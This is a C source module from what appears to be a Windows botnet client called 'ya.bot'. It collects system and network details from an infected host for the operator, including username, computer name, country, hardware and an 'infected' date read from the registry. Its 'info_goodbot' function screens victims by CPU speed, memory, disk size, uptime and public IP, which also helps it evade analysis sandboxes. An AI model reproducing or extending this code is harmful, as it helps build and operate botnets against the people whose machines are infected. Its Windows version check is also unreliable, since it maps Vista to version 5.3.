/*  ya.bot  */

#include "bot.h"

__int64 info_cpucycle()
{
	unsigned int i, j;
	__asm
	{
			rdtsc
			mov i, edx;
			mov j, eax;
	}
		return ((__int64)i << 32) + (__int64)j;
}

DWORD info_cpuspeed()
{
	__int64 i64CPUSpeed, i64Cycle;
		i64Cycle = info_cpucycle();
		Sleep(1000);
		i64CPUSpeed = ((info_cpucycle() - i64Cycle) / 1000000);
		return (DWORD)i64CPUSpeed;
}

#ifndef NO_INFO
void info_getnet(SOCKET bsock, char *pszServer, char *pszBuffer, DWORD dwSize)
{
	char szConnection[LOWBUF], szHost[LOWBUF];
	DWORD dwConnection;
	hostent *he;
	struct sockaddr_in sin;

#ifndef NO_DEBUG
		debug_print("[DEBUG] Getting connection info, netinfo_get()");
#endif

		InternetGetConnectedStateEx(&dwConnection, szConnection, sizeof(szConnection) - 1, 0);
	if (gethostname(szHost, sizeof(szHost) - 1) == SOCKET_ERROR)
			strncpy(szHost,
					string_infoquestionmarks,
					sizeof(szHost) - 1);
		he = gethostbyname(pszServer);
		memcpy(&sin.sin_addr.s_addr, he->h_addr_list[0], he->h_length); // FIXME get external ip
		_snprintf(pszBuffer, dwSize,
				string_infonet,
				CGREEN, string_replyinfo, CEND, string_replydotbot,
				CBLUE, CEND, szConnection,
				CBLUE, CEND, szHost,
				CBLUE, CEND, inet_ntoa(sin.sin_addr),
				CBLUE, CEND, ip_getip(bsock));
		return;
}

void info_getsys(char *pszBuffer, DWORD dwSize)
{
	char szComputerName[MEDBUF], szCountry[LOWBUF], szDate[LOWBUF], szOperatingSystem[LOWBUF],
			szSysDir[MAX_PATH], szUserName[MEDBUF];
	DWORD dwBufferSize = MEDBUF;
	__int64 i64FreeBytes, i64TotalBytes, i64Uptime;
	MEMORYSTATUS msMemory;
	OSVERSIONINFO ovInfo;

#ifndef NO_DEBUG
		debug_print("[DEBUG] Getting system info, info_sysget()");
#endif

		GlobalMemoryStatus(&msMemory);
		GetDiskFreeSpaceEx(NULL,
				NULL,
				(PULARGE_INTEGER)&i64TotalBytes,
				(PULARGE_INTEGER)&i64FreeBytes);
		ovInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		GetVersionEx(&ovInfo);
	if ((ovInfo.dwMajorVersion == 4) && (ovInfo.dwMinorVersion == 0))
	{
		if (ovInfo.dwPlatformId == VER_PLATFORM_WIN32_NT)
				strncpy(szOperatingSystem, string_infowindowsnt, sizeof(szOperatingSystem) - 1);
	}
	else if ((ovInfo.dwMajorVersion == 5) && (ovInfo.dwMinorVersion == 0))
			_snprintf(szOperatingSystem, sizeof(szOperatingSystem) - 1,
					string_infowindowsbuild,
					string_infowindows2000,
					ovInfo.szCSDVersion,
					ovInfo.dwMajorVersion,
					ovInfo.dwMinorVersion,
					ovInfo.dwBuildNumber);
	else if ((ovInfo.dwMajorVersion == 5) && (ovInfo.dwMinorVersion == 1))
			_snprintf(szOperatingSystem, sizeof(szOperatingSystem) - 1,
					string_infowindowsbuild,
					string_infowindowsxp,
					ovInfo.szCSDVersion,
					ovInfo.dwMajorVersion,
					ovInfo.dwMinorVersion,
					ovInfo.dwBuildNumber);
	else if ((ovInfo.dwMajorVersion == 5) && (ovInfo.dwMinorVersion == 2))
			_snprintf(szOperatingSystem, sizeof(szOperatingSystem) - 1,
					string_infowindowsbuild,
					string_infowindows2003,
					ovInfo.szCSDVersion,
					ovInfo.dwMajorVersion,
					ovInfo.dwMinorVersion,
					ovInfo.dwBuildNumber);
	else if ((ovInfo.dwMajorVersion == 5) && (ovInfo.dwMinorVersion == 3))
			_snprintf(szOperatingSystem, sizeof(szOperatingSystem) - 1,
					string_infowindowsbuild,
					string_infowindowsvista,
					ovInfo.szCSDVersion,
					ovInfo.dwMajorVersion,
					ovInfo.dwMinorVersion,
					ovInfo.dwBuildNumber);
	else
			strncpy(szOperatingSystem, string_infoquestionmarks, sizeof(szOperatingSystem) - 1);
		GetSystemDirectory(szSysDir, sizeof(szSysDir) - 1);
		i64Uptime = getuptime();
	if (!GetUserName(szUserName, &dwBufferSize))
			strncpy(szUserName,
					string_infoquestionmarks,
					sizeof(szUserName) - 1);
		dwBufferSize = MEDBUF;
	if (!GetComputerName(szComputerName, &dwBufferSize))
			strncpy(szComputerName,
					string_infoquestionmarks,
					sizeof(szComputerName) - 1);
	if (!GetLocaleInfo(LOCALE_USER_DEFAULT,  LOCALE_SENGCOUNTRY, szCountry, sizeof(szCountry) - 1))
			strncpy(szCountry,
					string_infoquestionmarks,
					sizeof(szCountry) - 1);
	if (!registry_readvalue(HKEY_LOCAL_MACHINE,
			(char *)string_infoinfectedsubkey,
			(char *)string_infoinfectedvaluename,
			szDate,
			sizeof(szDate) - 1)) strncpy(szDate, string_infoquestionmarks, sizeof(szDate) - 1);
		_snprintf(pszBuffer, dwSize,
				string_infosys,
				CGREEN, string_replyinfo, CEND, string_replydotbot,
				CBLUE, CEND, info_cpuspeed(),
				CBLUE, CEND, msMemory.dwTotalPhys / 1048576, msMemory.dwAvailPhys / 1048576,
				CBLUE, CEND, i64TotalBytes / 1073741824, i64TotalBytes / 1048576,
				i64FreeBytes / 1073741824, i64FreeBytes / 1048576,
				CBLUE, CEND, szOperatingSystem,
				CBLUE, CEND, szSysDir,
				CBLUE, CEND, i64Uptime / 86400,
				i64Uptime / 3600,
				(i64Uptime % 3600) / 60,
				CBLUE, CEND, szUserName,
				CBLUE, CEND, szComputerName,
				CBLUE, CEND, szCountry,
				CBLUE, CEND, szDate);
		return;
}
#endif

bool info_goodbot(SOCKET bsock)
{
	__int64 i64FreeBytes, i64TotalBytes, i64Uptime;
	MEMORYSTATUS msMemory;

#ifndef NO_DEBUG
		debug_print("[DEBUG] Checking if bot is good, info_goodbot()");
#endif

	if (info_cpuspeed() < 1999)
			return FALSE;
		GlobalMemoryStatus(&msMemory);
	if ((msMemory.dwTotalPhys / 1048576) < 511)
			return FALSE;
		GetDiskFreeSpaceEx(NULL,
				NULL,
				(PULARGE_INTEGER)&i64TotalBytes,
				(PULARGE_INTEGER)&i64FreeBytes);
	if ((i64TotalBytes / 1073741824) < 39)
			return FALSE;
		i64Uptime = getuptime();
	if ((i64Uptime / 86400) < 14)
			return FALSE;
	if (ip_privateip(ip_getip(bsock)))
			return FALSE;
		return TRUE;
}

int info_os()
{
	OSVERSIONINFO ovInfo;
		ovInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		GetVersionEx(&ovInfo);
	if ((ovInfo.dwMajorVersion == 4) && (ovInfo.dwMinorVersion == 0))
	{
		if (ovInfo.dwPlatformId == VER_PLATFORM_WIN32_NT)
				return OS_WINNT;
	}
	else if ((ovInfo.dwMajorVersion == 5) && (ovInfo.dwMinorVersion == 0))
			return OS_WIN2000;
	else if ((ovInfo.dwMajorVersion == 5) && (ovInfo.dwMinorVersion == 1))
			return OS_WINXP;
	else if ((ovInfo.dwMajorVersion == 5) && (ovInfo.dwMinorVersion == 2))
			return OS_WIN2003;
	else if ((ovInfo.dwMajorVersion == 5) && (ovInfo.dwMinorVersion == 3))
			return OS_WINVISTA;
		return OS_UNKNOWN;
}